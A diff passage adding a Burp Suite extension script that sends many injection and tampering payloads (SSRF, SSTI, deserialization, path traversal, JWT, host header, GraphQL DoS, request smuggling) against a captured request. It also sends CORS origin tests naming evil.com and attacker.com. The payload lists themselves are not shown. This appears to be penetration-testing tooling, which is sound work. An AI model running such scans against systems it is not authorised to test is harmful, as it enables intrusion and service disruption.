+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, ssrfPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat2f] SSRF: '" + ssrfPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with SSRF '" + ssrfPayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // 2g. SSTI (Server-Side Template Injection)
+    // ============================================================
+    logging().logToOutput("[ === Category 2g: SSTI Tests === ]");
+    for (String sstiPayload : SSTI_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, sstiPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat2g] SSTI: '" + sstiPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with SSTI '" + sstiPayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // 2h. Expression Language Injection
+    // ============================================================
+    logging().logToOutput("[ === Category 2h: Expression Language Injection Tests === ]");
+    for (String elPayload : EXPRESSION_LANGUAGE_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, elPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat2h] Expression Language Injection: '" + elPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with EL Injection '" + elPayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // 4f. Path Traversal / LFI
+    // ============================================================
+    logging().logToOutput("[ === Category 4f: Path Traversal Tests === ]");
+    for (String pathPayload : PATH_TRAVERSAL_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, pathPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4f] Path Traversal: '" + pathPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Path Traversal '" + pathPayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // 4g. Deserialization Attacks
+    // ============================================================
+    logging().logToOutput("[ === Category 4g: Deserialization Tests === ]");
+    for (String deserPayload : DESERIALIZATION_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, deserPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4g] Deserialization Attack: '" + deserPayload.substring(0, Math.min(50, deserPayload.length())) + "...'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Deserialization: " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // 4h. CRLF Injection
+    // ============================================================
+    logging().logToOutput("[ === Category 4h: CRLF Injection Tests === ]");
+    for (String crlfPayload : CRLF_INJECTION_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, crlfPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4h] CRLF Injection: '" + crlfPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with CRLF Injection '" + crlfPayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // 4i. Mass Assignment
+    // ============================================================
+    logging().logToOutput("[ === Category 4i: Mass Assignment Tests === ]");
+    for (String massPayload : MASS_ASSIGNMENT_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                massPayload, "true", param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4i] Mass Assignment: '" + massPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Mass Assignment '" + massPayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // 4j. Prototype Pollution
+    // ============================================================
+    logging().logToOutput("[ === Category 4j: Prototype Pollution Tests === ]");
+    for (String protoPayload : PROTOTYPE_POLLUTION_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, protoPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4j] Prototype Pollution: '" + protoPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Prototype Pollution '" + protoPayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // 4k. File Upload Bypass
+    // ============================================================
+    logging().logToOutput("[ === Category 4k: File Upload Bypass Tests === ]");
+    for (String filePayload : FILE_UPLOAD_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, filePayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4k] File Upload Bypass: '" + filePayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with File Upload Bypass '" + filePayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // 4l. Business Logic
+    // ============================================================
+    logging().logToOutput("[ === Category 4l: Business Logic Tests === ]");
+    for (String bizPayload : BUSINESS_LOGIC_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, bizPayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4l] Business Logic: '" + bizPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Business Logic '" + bizPayload + "': " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // 4m. Unicode Normalization
+    // ============================================================
+    logging().logToOutput("[ === Category 4m: Unicode Normalization Tests === ]");
+    for (String unicodePayload : UNICODE_NORMALIZATION_PAYLOADS) {
+        var modifiedRequest = originalRequest.withParameter(
+            burp.api.montoya.http.message.params.HttpParameter.parameter(
+                paramName, unicodePayload, param.type()
+            )
+        );
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat4m] Unicode Normalization: '" + unicodePayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Unicode Normalization '" + unicodePayload + "': " + e.getMessage());
+        }
+    }
+
+}
+
+// ############################################################
+// ############################################################
+// ##                                                        ##
+// ##  PART 2: PER-REQUEST TESTS EXECUTION                  ##
+// ##  (Run ONCE per request - headers/methods/global)      ##
+// ##                                                        ##
+// ############################################################
+// ############################################################
+
+logging().logToOutput("\n[ ======================================= ]");
+logging().logToOutput("[ === PER-REQUEST TESTS (Headers/Methods) === ]");
+logging().logToOutput("[ ======================================= ]\n");
+
+// ============================================================
+// CATEGORY 5: AUTHENTICATION & SESSION MANAGEMENT
+// ============================================================
+
+logging().logToOutput("[ === Category 5a: Authentication & Session Tests === ]");
+
+// Test Authorization header tampering
+for (String authHeader : AUTH_HEADERS) {
+    for (String authPayload : AUTH_HEADER_TESTS) {
+        var modifiedRequest = originalRequest.withHeader(authHeader, authPayload);
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat5a] Auth Header [" + authHeader + "]: '" + authPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Auth Header [" + authHeader + "] '" + authPayload + "': " + e.getMessage());
+        }
+    }
+}
+
+// JWT Tampering Tests
+logging().logToOutput("[ === Category 5b: JWT Tampering Tests === ]");
+for (String jwtPayload : JWT_TAMPERING_PAYLOADS) {
+    var modifiedRequest = originalRequest.withHeader("Authorization", "Bearer " + jwtPayload);
+
+    try {
+        var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = httpRequestResponse.response().statusCode();
+        String result = "[Cat5b] JWT Tampering: '" + jwtPayload.substring(0, Math.min(50, jwtPayload.length())) + "...'";
+        logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+        httpRequestResponse.annotations().setNotes(result);
+        api().organizer().sendToOrganizer(httpRequestResponse);
+        results.append(result + "\n");
+        totalRequests++;
+    } catch (Exception e) {
+        logging().logToError("Error with JWT Tampering: " + e.getMessage());
+    }
+}
+
+// Token Removal Test
+logging().logToOutput("[ === Category 5c: Token Removal Test === ]");
+var requestWithoutAuth = originalRequest.withRemovedHeader("Authorization");
+try {
+    var httpRequestResponse = api().http().sendRequest(requestWithoutAuth);
+    Thread.sleep(GLOBAL_DELAY_MS);
+    
+    int status = httpRequestResponse.response().statusCode();
+    String result = "[Cat5c] Token Removal Test";
+    logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+    httpRequestResponse.annotations().setNotes(result);
+    api().organizer().sendToOrganizer(httpRequestResponse);
+    results.append(result + "\n");
+    totalRequests++;
+} catch (Exception e) {
+    logging().logToError("Error with Token Removal Test: " + e.getMessage());
+}
+
+// ============================================================
+// Category 6: Authorization - Privilege Escalation via Headers (PER-REQUEST)
+// ============================================================
+logging().logToOutput("[ === Category 6a: Privilege Escalation Header Tests === ]");
+for (String privPayload : PRIVILEGE_ESCALATION_PAYLOADS) {
+    String[] parts = privPayload.split("=");
+    if (parts.length == 2) {
+        var modifiedRequest = originalRequest.withAddedHeader("X-" + parts[0], parts[1]);
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat6a] Privilege Escalation Header: '" + privPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Privilege Escalation '" + privPayload + "': " + e.getMessage());
+        }
+    }
+}
+
+// ============================================================
+// Category 7: HTTP Methods Testing (PER-REQUEST)
+// ============================================================
+logging().logToOutput("[ === Category 7a: HTTP Method Tests === ]");
+for (String method : HTTP_METHODS_TO_TEST) {
+    try {
+        var modifiedRequest = originalRequest.withMethod(method);
+        var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = httpRequestResponse.response().statusCode();
+        String result = "[Cat7a] HTTP Method: '" + method + "'";
+        logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+        httpRequestResponse.annotations().setNotes(result);
+        api().organizer().sendToOrganizer(httpRequestResponse);
+        results.append(result + "\n");
+        totalRequests++;
+    } catch (Exception e) {
+        logging().logToError("Error with HTTP Method '" + method + "': " + e.getMessage());
+    }
+}
+
+// HTTP Verb Tampering (POST to GET and vice versa)
+logging().logToOutput("[ === Category 7b: HTTP Verb Tampering === ]");
+String originalMethod = originalRequest.method();
+String[] verbsToTest = {"GET", "POST", "PUT", "PATCH", "DELETE"};
+for (String verb : verbsToTest) {
+    if (!verb.equals(originalMethod)) {
+        try {
+            var modifiedRequest = originalRequest.withMethod(verb);
+            var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat7b] Verb Tampering " + originalMethod + " -> " + verb;
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Verb Tampering to '" + verb + "': " + e.getMessage());
+        }
+    }
+}
+
+// URL Redirection Tests
+logging().logToOutput("[ === Category 7c: URL Redirection Tests === ]");
+for (String redirectPayload : OPEN_REDIRECT_PAYLOADS) {
+    var modifiedRequest = originalRequest.withAddedHeader("X-Original-URL", redirectPayload);
+
+    try {
+        var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = httpRequestResponse.response().statusCode();
+        String result = "[Cat7c] Open Redirect: '" + redirectPayload + "'";
+        logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+        httpRequestResponse.annotations().setNotes(result);
+        api().organizer().sendToOrganizer(httpRequestResponse);
+        results.append(result + "\n");
+        totalRequests++;
+    } catch (Exception e) {
+        logging().logToError("Error with Open Redirect '" + redirectPayload + "': " + e.getMessage());
+    }
+}
+
+// ============================================================
+// Category 8: Content-Type Validation Tests (PER-REQUEST)
+// ============================================================
+logging().logToOutput("[ === Category 8a: Content-Type Validation Tests === ]");
+for (String contentType : CONTENT_TYPE_BYPASS) {
+    var modifiedRequest = originalRequest.withHeader("Content-Type", contentType);
+
+    try {
+        var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = httpRequestResponse.response().statusCode();
+        String result = "[Cat8a] Content-Type: '" + contentType + "'";
+        logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+        httpRequestResponse.annotations().setNotes(result);
+        api().organizer().sendToOrganizer(httpRequestResponse);
+        results.append(result + "\n");
+        totalRequests++;
+    } catch (Exception e) {
+        logging().logToError("Error with Content-Type '" + contentType + "': " + e.getMessage());
+    }
+}
+
+// ============================================================
+// Category 8: Security Misconfiguration - CORS Tests (PER-REQUEST)
+// ============================================================
+logging().logToOutput("[ === Category 8b: CORS Misconfiguration Tests === ]");
+String[] corsOrigins = {
+    "https://evil.com",
+    "null",
+    "https://attacker.com",
+    "file://",
+    "http://localhost",
+    "https://trusted.com.evil.com"
+};
+
+for (String origin : corsOrigins) {
+    var modifiedRequest = originalRequest.withAddedHeader("Origin", origin);
+
+    try {
+        var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = httpRequestResponse.response().statusCode();
+        String acaoHeader = httpRequestResponse.response().headerValue("Access-Control-Allow-Origin");
+        String acacHeader = httpRequestResponse.response().headerValue("Access-Control-Allow-Credentials");
+        
+        String result = "[Cat8b] CORS Test Origin: '" + origin + "' ACAO: " + acaoHeader + " ACAC: " + acacHeader;
+        logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+        httpRequestResponse.annotations().setNotes(result);
+        api().organizer().sendToOrganizer(httpRequestResponse);
+        results.append(result + "\n");
+        totalRequests++;
+    } catch (Exception e) {
+        logging().logToError("Error with CORS Test '" + origin + "': " + e.getMessage());
+    }
+}
+
+// ============================================================
+// Category 8: Host Header & Cache Poisoning Tests (PER-REQUEST)
+// ============================================================
+logging().logToOutput("[ === Category 8c: Host Header & Cache Poisoning Tests === ]");
+for (String hostPayload : HOST_HEADER_PAYLOADS) {
+    // Test with modified Host header
+    var modifiedRequest = originalRequest.withHeader("Host", hostPayload);
+
+    try {
+        var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = httpRequestResponse.response().statusCode();
+        String result = "[Cat8c] Host Header Injection: '" + hostPayload + "'";
+        logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+        httpRequestResponse.annotations().setNotes(result);
+        api().organizer().sendToOrganizer(httpRequestResponse);
+        results.append(result + "\n");
+        totalRequests++;
+    } catch (Exception e) {
+        logging().logToError("Error with Host Header '" + hostPayload + "': " + e.getMessage());
+    }
+
+    // Test with cache poisoning headers
+    for (String cacheHeader : CACHE_POISONING_HEADERS) {
+        var modifiedRequestCache = originalRequest.withAddedHeader(cacheHeader, hostPayload);
+
+        try {
+            var httpRequestResponse = api().http().sendRequest(modifiedRequestCache);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = httpRequestResponse.response().statusCode();
+            String result = "[Cat8d] Cache Poisoning [" + cacheHeader + "]: '" + hostPayload + "'";
+            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+            httpRequestResponse.annotations().setNotes(result);
+            api().organizer().sendToOrganizer(httpRequestResponse);
+            results.append(result + "\n");
+            totalRequests++;
+        } catch (Exception e) {
+            logging().logToError("Error with Cache Poisoning [" + cacheHeader + "] '" + hostPayload + "': " + e.getMessage());
+        }
+    }
+}
+
+// ============================================================
+// Category 9: Response Analysis - Security Headers Check (PER-REQUEST)
+// ============================================================
+logging().logToOutput("[ === Category 9a: Security Headers Analysis === ]");
+try {
+    var httpRequestResponse = api().http().sendRequest(originalRequest);
+    Thread.sleep(GLOBAL_DELAY_MS);
+    
+    StringBuilder headerAnalysis = new StringBuilder();
+    headerAnalysis.append("[Cat9a] Security Headers Analysis:\n");
+    
+    for (String header : SECURITY_HEADERS_TO_CHECK) {
+        String headerValue = httpRequestResponse.response().headerValue(header);
+        if (headerValue != null) {
+            headerAnalysis.append("  " + header + ": " + headerValue + "\n");
+            
+            // Flag potentially bad headers
+            if (header.equals("X-Powered-By") || header.equals("Server") || 
+                header.equals("X-AspNet-Version") || header.equals("X-AspNetMvc-Version")) {
+                logging().logToOutput("[ALERT] Information Disclosure: " + header + " = " + headerValue);
+            }
+            
+            // Check CORS headers for misconfiguration
+            if (header.equals("Access-Control-Allow-Origin") && headerValue.equals("*")) {
+                logging().logToOutput("[ALERT] Wildcard CORS detected: " + headerValue);
+            }
+            if (header.equals("Access-Control-Allow-Credentials") && headerValue.equals("true")) {
+                logging().logToOutput("[ALERT] CORS with credentials enabled");
+            }
+        } else {
+            headerAnalysis.append("  " + header + ": MISSING\n");
+            
+            // Flag missing security headers
+            if (header.equals("X-Content-Type-Options") || header.equals("X-Frame-Options") ||
+                header.equals("Content-Security-Policy") || header.equals("Strict-Transport-Security")) {
+                logging().logToOutput("[ALERT] Missing Security Header: " + header);
+            }
+        }
+    }
+    
+    String result = headerAnalysis.toString();
+    logging().logToOutput(result);
+    
+    httpRequestResponse.annotations().setNotes("[Cat9a] Security Headers Analysis");
+    api().organizer().sendToOrganizer(httpRequestResponse);
+    results.append(result + "\n");
+    totalRequests++;
+    
+    // Check for sensitive data in response body
+    String responseBody = httpRequestResponse.response().bodyToString().toLowerCase();
+    for (String pattern : SENSITIVE_DATA_PATTERNS) {
+        if (responseBody.contains(pattern.toLowerCase())) {
+            logging().logToOutput("[ALERT] Potential sensitive data in response: " + pattern);
+            results.append("[ALERT] Potential sensitive data: " + pattern + "\n");
+        }
+    }
+    
+} catch (Exception e) {
+    logging().logToError("Error with Security Headers Analysis: " + e.getMessage());
+}
+
+// ============================================================
+// Category 9c: Cookie Security Analysis (PER-REQUEST)
+// ============================================================
+logging().logToOutput("[ === Category 9c: Cookie Security Analysis === ]");
+try {
+    var httpRequestResponse = api().http().sendRequest(originalRequest);
+    Thread.sleep(GLOBAL_DELAY_MS);
+    
+    java.util.List<String> setCookieHeaders = new java.util.ArrayList<>();
+    for (burp.api.montoya.http.message.HttpHeader header : httpRequestResponse.response().headers()) {
+        if (header.name().equalsIgnoreCase("Set-Cookie")) {
+            setCookieHeaders.add(header.value());
+        }
+    }
+    
+    if (!setCookieHeaders.isEmpty()) {
+        StringBuilder cookieAnalysis = new StringBuilder();
+        cookieAnalysis.append("[Cat9c] Cookie Security Analysis:\n");
+        
+        for (String cookie : setCookieHeaders) {
+            cookieAnalysis.append("  Cookie: " + cookie + "\n");
+            
+            String cookieLower = cookie.toLowerCase();
+            
+            // Check for Secure flag
+            if (!cookieLower.contains("secure")) {
+                logging().logToOutput("[ALERT] Cookie missing Secure flag: " + cookie.split(";")[0]);
+                cookieAnalysis.append("    [ALERT] Missing Secure flag\n");
+            }
+            
+            // Check for HttpOnly flag
+            if (!cookieLower.contains("httponly")) {
+                logging().logToOutput("[ALERT] Cookie missing HttpOnly flag: " + cookie.split(";")[0]);
+                cookieAnalysis.append("    [ALERT] Missing HttpOnly flag\n");
+            }
+            
+            // Check for SameSite attribute
+            if (!cookieLower.contains("samesite")) {
+                logging().logToOutput("[ALERT] Cookie missing SameSite attribute: " + cookie.split(";")[0]);
+                cookieAnalysis.append("    [ALERT] Missing SameSite attribute\n");
+            }
+            
+            // Check for session/persistent cookie (no Expires or Max-Age = session cookie)
+            if (cookieLower.contains("expires") || cookieLower.contains("max-age")) {
+                logging().logToOutput("[INFO] Persistent cookie detected: " + cookie.split(";")[0]);
+                cookieAnalysis.append("    [INFO] Persistent cookie detected\n");
+            }
+        }
+        
+        String result = cookieAnalysis.toString();
+        logging().logToOutput(result);
+        
+        httpRequestResponse.annotations().setNotes("[Cat9c] Cookie Security Analysis");
+        api().organizer().sendToOrganizer(httpRequestResponse);
+        results.append(result + "\n");
+    } else {
+        logging().logToOutput("[INFO] No Set-Cookie headers in response");
+    }
+    
+    totalRequests++;
+    
+} catch (Exception e) {
+    logging().logToError("Error with Cookie Security Analysis: " + e.getMessage());
+}
+
+// ============================================================
+// Category 10a: GraphQL Testing (PER-REQUEST)
+// ============================================================
+logging().logToOutput("[ === Category 10a: GraphQL Attack Tests === ]");
+
+// GraphQL Introspection
+for (String graphqlPayload : GRAPHQL_INTROSPECTION_PAYLOADS) {
+    var modifiedRequest = originalRequest.withBody(graphqlPayload);
+    modifiedRequest = modifiedRequest.withHeader("Content-Type", "application/json");
+
+    try {
+        var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = httpRequestResponse.response().statusCode();
+        String result = "[Cat10a] GraphQL Introspection Query";
+        logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+        httpRequestResponse.annotations().setNotes(result);
+        api().organizer().sendToOrganizer(httpRequestResponse);
+        results.append(result + "\n");
+        totalRequests++;
+    } catch (Exception e) {
+        logging().logToError("Error with GraphQL Introspection: " + e.getMessage());
+    }
+}
+
+// GraphQL Injection Tests
+for (String graphqlInjPayload : GRAPHQL_INJECTION_PAYLOADS) {
+    var modifiedRequest = originalRequest.withBody(graphqlInjPayload);
+    modifiedRequest = modifiedRequest.withHeader("Content-Type", "application/json");
+
+    try {
+        var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = httpRequestResponse.response().statusCode();
+        String result = "[Cat10a] GraphQL Injection: '" + graphqlInjPayload.substring(0, Math.min(50, graphqlInjPayload.length())) + "...'";
+        logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+        httpRequestResponse.annotations().setNotes(result);
+        api().organizer().sendToOrganizer(httpRequestResponse);
+        results.append(result + "\n");
+        totalRequests++;
+    } catch (Exception e) {
+        logging().logToError("Error with GraphQL Injection: " + e.getMessage());
+    }
+}
+
+// GraphQL DoS Tests
+for (String graphqlDosPayload : GRAPHQL_DOS_PAYLOADS) {
+    var modifiedRequest = originalRequest.withBody(graphqlDosPayload);
+    modifiedRequest = modifiedRequest.withHeader("Content-Type", "application/json");
+
+    try {
+        var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = httpRequestResponse.response().statusCode();
+        String result = "[Cat10a] GraphQL DoS (Depth/Complexity)";
+        logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+        httpRequestResponse.annotations().setNotes(result);
+        api().organizer().sendToOrganizer(httpRequestResponse);
+        results.append(result + "\n");
+        totalRequests++;
+    } catch (Exception e) {
+        logging().logToError("Error with GraphQL DoS: " + e.getMessage());
+    }
+}
+
+// ============================================================
+// Category 10b: HTTP Request Smuggling (PER-REQUEST)
+// ============================================================
+logging().logToOutput("[ === Category 10b: HTTP Request Smuggling Tests === ]");
+
+for (String smugglePayload : REQUEST_SMUGGLING_PAYLOADS) {
+    // Note: Request smuggling requires careful header manipulation
+    // This is a basic test - real smuggling needs more sophisticated setup
+    var modifiedRequest = originalRequest.withAddedHeader("X-Smuggle-Test", smugglePayload);
+
+    try {
+        var httpRequestResponse = api().http().sendRequest(modifiedRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = httpRequestResponse.response().statusCode();
+        String result = "[Cat10b] HTTP Request Smuggling Test";
+        logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+
+        httpRequestResponse.annotations().setNotes(result);
+        api().organizer().sendToOrganizer(httpRequestResponse);
+        results.append(result + "\n");
+        totalRequests++;
+    } catch (Exception e) {
+        logging().logToError("Error with Request Smuggling: " + e.getMessage());
+    }
+}
+
+// ============================================================
+// API SECURITY TESTING COMPLETE
+// ============================================================
+
+logging().logToOutput("[ ======================================= ]");
+logging().logToOutput("[ === API SECURITY TESTING COMPLETE === ]");
+logging().logToOutput("[ ======================================= ]\n");
+logging().logToOutput("Parameters tested: " + allParams.size() + "\nTotal Requests: " + totalRequests + "\nCheck the organizer tab for output");
+logging().logToOutput("\n[ ======================================= ]");
+logging().logToOutput("SUMMARY OF CATEGORIES TESTED (ADVANCED):");
+logging().logToOutput("[ ======================================= ]");
+logging().logToOutput("");
+logging().logToOutput("--- PARAMETER-BASED TESTS (per parameter) ---");
+logging().logToOutput("Cat 1. Input Fuzzing - Numeric (1a) and String (1b) fuzzing");
+logging().logToOutput("Cat 2. Injection Attacks - SQL (2a), OS Command (2b), LDAP (2c), XPath (2d), Code (2e)");
+logging().logToOutput("   - SSRF (2f) - Cloud Metadata, Internal Services, Protocol Smuggling");
+logging().logToOutput("   - SSTI (2g) - Jinja2, Twig, Freemarker, Velocity, Thymeleaf, ERB, EJS");
+logging().logToOutput("   - Expression Language Injection (2h) - SpEL, OGNL, MVEL, EL");
+logging().logToOutput("Cat 3. Authorization (IDOR) - IDOR patterns (3a), ID enumeration");
